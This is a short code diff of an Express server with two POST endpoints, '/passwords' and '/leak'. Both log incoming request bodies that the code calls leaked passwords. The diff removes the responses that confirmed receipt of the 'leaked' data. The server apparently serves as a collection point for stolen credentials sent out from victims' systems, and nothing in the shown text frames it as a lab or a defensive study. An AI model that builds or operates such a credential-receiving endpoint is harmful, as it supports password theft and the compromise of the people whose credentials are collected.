@@ -9,13 +9,11 @@ app.use(express.json())
 app.post("/passwords", (req, res) => {
     const leakedPasswords = req.body
     console.log(leakedPasswords)
-    res.send("successfully leaked password")
 })
 
 app.post("/leak", (req, res) => {
     const leakedPasswords = req.body
     console.log(leakedPasswords)
-    res.send("Received leaked data")
 })
 
 const PORT = 8080
